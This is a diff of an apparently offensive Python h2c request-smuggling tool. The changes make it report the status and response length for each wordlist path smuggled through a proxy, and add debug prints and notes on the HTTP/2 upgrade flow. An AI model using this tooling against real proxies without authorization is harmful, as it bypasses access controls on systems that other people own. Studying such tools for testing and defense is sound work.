@@ -14,18 +14,28 @@ MAX_TIMEOUT = 10
 UPGRADE_ONLY = False
 
 
-def handle_events(events, isVerbose):
+def handle_events(events, request, isVerbose):
+    host = request[1][1]
+    path = request[3][1]
+    response_length = 0
+
     for event in events:
         if isinstance(event, ResponseReceived):
-            handle_response(event.headers, event.stream_id)
+            for n, v in event.headers:
+                if n == b":status":
+                    status_code = v.decode('utf-8')
+            #  handle_response(event.headers, event.stream_id)
         elif isinstance(event, DataReceived):
-            print(event.data.decode('utf-8', 'replace'))
-            print("")
+            response_length += len(event.data.decode("utf-8", 'replace'))
+            #  print(event.data.decode('utf-8', 'replace'))
+            #  print("")
         elif isinstance(event, StreamReset):
             raise RuntimeError("stream reset: %d" % event.error_code)
         else:
             if isVerbose:
                 print("[INFO] " + str(event))
+
+    print(f'{host}{path} - {status_code} - {response_length}')
 
 
 def handle_response(response_headers, stream_id):
@@ -169,7 +179,7 @@ def sendSmuggledRequest(h2_connection, connection, smuggled_request_headers,
 
     # Custom Step 4: Receive data and process
     events = getData(h2_connection, connection)
-    handle_events(events, args.verbose)
+    handle_events(events, smuggled_request_headers, args.verbose)
 
 
 def main(args):
@@ -196,8 +206,15 @@ def main(args):
         print("[INFO] Success! " + args.proxy + " can be used for tunneling")
         sys.exit(0)
 
+    import time
+    #  time.sleep(2)
+
     # Step 5: Immediately send the pending HTTP/2 data.
-    connection.sendall(h2_connection.data_to_send())
+    # This must send the http pri request that establishes http2
+    # also appears to send the initial get request again
+    d = h2_connection.data_to_send()
+    print("data to send ", d)
+    connection.sendall(d)
 
     # Step 6: Feed the body data to the connection.
     events = h2_connection.receive_data(extra_data)
@@ -205,9 +222,16 @@ def main(args):
     # Step 7 Receive data and process
     events = getData(h2_connection, connection)
 
-    connection.sendall(h2_connection.data_to_send())
+    # We then have recieved the response
 
-    handle_events(events, args.verbose)
+    handle_events(events, [(), ('host', proxy_url.netloc), (),
+                           ('path', proxy_url.path)], args.verbose)
+
+    # This is an ack
+    d = h2_connection.data_to_send()
+    print("data to send", d)
+
+    connection.sendall(d)
 
     # Craft request headers and grab next available stream id
     if args.wordlist:
@@ -219,6 +243,8 @@ def main(args):
     else:
         urls = [urlparse(args.url)]
 
+    import time
+    #  time.sleep(5)
     for url in urls:
         path = url.path or "/"
 
@@ -235,7 +261,7 @@ def main(args):
                 smuggled_request_headers.append(tuple(header.split(": ")))
 
         # Send request
-        print("[INFO] Requesting - " + path)
+        #  print("[INFO] Requesting - " + path)
         sendSmuggledRequest(h2_connection, connection,
                             smuggled_request_headers, args)
 
